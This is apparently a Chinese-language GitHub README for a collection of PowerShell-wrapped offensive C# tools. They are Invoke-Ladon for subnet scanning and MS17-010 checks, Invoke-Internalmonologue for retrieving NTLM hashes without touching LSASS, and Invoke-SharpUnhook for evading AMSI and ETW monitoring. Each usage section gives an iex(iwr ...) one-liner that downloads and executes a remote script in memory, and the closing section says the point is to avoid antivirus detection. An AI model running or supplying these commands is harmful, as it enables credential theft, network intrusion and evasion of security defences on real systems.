



## 前言：
windows平台上许多攻击性武器都是由C#编写的，并且可以轻松地转为powershell脚本，我将这个仓库作为一个集合，用来储存OffensiveCsharp的powershell代码
# 1.Invoke-Ladon
之前使用Ladon的Powershell版本的时候似乎不能把扫描内容输出到txt文本中，因此我对它做了一点小小的修改。

使用Gzip-compress 和 base64-Encode 转换Ladon的二进制文件然后base64编码解码 并通过[System.Reflection.Assembly]::Load($DecompressedDecodedBinary)在powershell中加载Ladon的二进制文件
## 使用方法：

注意参数中需要加双引号



#### 1.扫描在线主机

```
iex(iwr -UseBasicParsing https://raw.githubusercontent.com/INotGreen/Invoke-Ladon/main/Invoke-Ladon.ps1);
invoke-ladon "192.168.1.8/24 OnlinePC" > OnlinePC.txt
```
![image](https://user-images.githubusercontent.com/89376703/197330353-73fb556c-b59b-43e9-a3ac-bc3e28d15644.png)




#### 2.扫描漏洞MS17017



```
iex(iwr -UseBasicParsing https://raw.githubusercontent.com/INotGreen/Invoke-Ladon/main/Invoke-Ladon.ps1);
invoke-ladon "192.168.1.8/24 MS17010" > MS17010.txt
```
![image](https://user-images.githubusercontent.com/89376703/197330367-387b676a-6a4c-4ea9-951d-56aac29229e4.png)




具体使用方法请参考：https://github.com/k8gege/Ladon

或者直接把调用命令放在脚本最后一行

![image](https://user-images.githubusercontent.com/89376703/197330378-fff9e947-3c5e-47b8-b4ae-02576fdee671.png)
# 2.Invoke-Internalmonologue

Internalmonologue

Internalmonologue：在不接触 LSASS 的情况下检索 NTLM 哈希:https://github.com/eladshamir/Internal-Monologue

用法：
```
iex(iwr -UseBasicParsing https://raw.githubusercontent.com/INotGreen/Invoke-SharpOffensive/main/Invoke-Internalmonologue.ps1)
```

# 3.Invoke-SharpUnhook.ps1
SharpUnhook用于规避AMSI的内存检测、ETW的监控同时hook了ring3的API，或许它仍然会被高级防病毒检测，
这只是一个例子，不要依赖它:https://github.com/GetRektBoy724/SharpUnhooker

用法：
远程加载
```
iex(iwr -UseBasicParsing https://raw.githubusercontent.com/INotGreen/Invoke-SharpOffensive/main/Invoke-SharpUnhook.ps1)
```
本地加载

```
Import-Module .\Invoke-SharpUnhook.ps1
```
![image](https://user-images.githubusercontent.com/89376703/200115967-953b394b-90ad-477c-b12c-7370c73fe667.png)



### 总结

使用某些方法可以封装powershell的脚本，让powershell在内存中运行，以此规避一些防病毒软件的查杀，这样就防止从Ladon的源码进行免杀处理的操作,对于powershell的免杀，有时候还要考虑规避AMSI的问题。
